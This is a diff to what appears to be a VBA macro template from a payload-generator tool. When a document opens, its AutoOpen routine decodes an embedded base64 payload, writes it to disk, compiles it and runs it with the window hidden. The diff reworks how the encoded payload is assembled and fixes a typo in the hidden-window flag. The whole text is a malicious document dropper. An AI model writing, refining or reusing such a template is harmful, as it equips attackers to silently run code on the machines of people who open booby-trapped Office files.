@@ -84,14 +84,17 @@ Sub iDn()
     $$$FILENAME$$$
     Dim oFile As Object
     Set oFile = myFso.CreateTextFile(fileName)
-    oFile.Write Decode64($$$ENCODED$$$)
+    Dim enc
+    enc = ""
+    $$$ENCODED$$$
+    oFile.Write Decode64(enc)
     oFile.Close
     Dim compileCmd
     $$$COMPILE$$$
     Call Shell(compileCmd, vbHide)
     Dim runCmd
     $$$RUN$$$
-    Call Shell(runCmd, vbHude)
+    Call Shell(runCmd, vbHide)
 End Sub
 Sub AutoOpen()
   iDn
